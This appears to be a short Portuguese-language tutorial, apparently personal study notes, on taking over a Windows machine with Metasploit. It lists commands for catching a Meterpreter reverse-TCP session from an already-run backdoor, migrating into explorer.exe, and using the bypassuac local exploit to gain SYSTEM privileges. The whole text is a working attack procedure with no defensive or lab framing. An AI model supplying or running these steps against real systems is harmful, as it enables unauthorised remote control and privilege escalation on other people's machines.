# Entrando na sessão e escalando privilegios

## Etapas

1. Como sudo , entrar no `msfconsole`
2. usar o `use multi/handler`
3. setar o payload `set payload windows/meterpreter/reverse_tcp`
4. setar o ip da sua maquina , a qual ira receber os dados `set lhost 100.000.00.0`
5. setar a porta que está no arquivo de backdoor , nesse caso a `4444`
6. `run` se o arquivo de backdoor foi executado , você está com a sessão aberta

## Agora vamos escalar os privilegios

1. começar trocando seu pid por um pid constante , digite o comando `ps` para ver uma lista de pid's , bom usar o do `explore.exe`
2. depois rodar o comando `migrate (novo pid)` para trocar o pid
3. Agora vamos usar um modulo diferente ,para ficar como admin , vamos começar deixando essa sessão de fundo com o comando `background`
4. vamos usar o modulo `use exploit/windows/local/bypassuac`
5. em seguida , temos que setar o payload, o host e a porta com os seguintes comandos
6. `set payload windows/meterpreter/reverse_tcp` para setar o payload
7. ver os `targets` e nesse caso , escolhi a arquitetua x86 , então precisar setar isso com o comando `set target 0`
8. `set lhost 000.000.00.0` para setar o host(ou seja o ip na maquina local)
9. `set lport 2022` para setar a porta , não precisa ser igual do backdoor, poder ser qualquer uma
10. agora , vamos conectar o modulo com a sessão que está aberta , pode rodar `sessions ` para ver as sessões e depois rodar `set session 1` no meu caso é a sessão 1
11. e por fim , rodar o `exploit` , com isso ele , levantará privilegios
12. para ver se funcionou mesmo , quando estiver no , meterpreter: rode o comando `getuid` se retornar `Server username: NT AUTHORITY\SYSTEM`, então funcionou corretamente
